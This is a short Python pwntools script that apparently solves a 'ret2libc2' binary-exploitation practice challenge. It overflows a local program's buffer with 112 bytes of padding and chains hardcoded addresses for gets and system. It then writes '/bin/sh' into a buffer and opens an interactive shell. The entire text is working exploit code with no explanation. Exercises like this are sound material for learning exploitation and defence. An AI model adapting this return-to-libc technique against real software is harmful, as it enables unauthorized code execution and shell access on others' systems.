##!/usr/bin/env python
from pwn import*
 
r=process('./ret2libc2')
 
system_addr=0x08048490
gets_addr=0x08048460
buf2_addr=0x0804A080
 
 
payload=flat([112*'A',gets_addr,system_addr,buf2_addr,buf2_addr])
 
r.sendline(payload)
r.sendline('/bin/sh')
r.interactive()           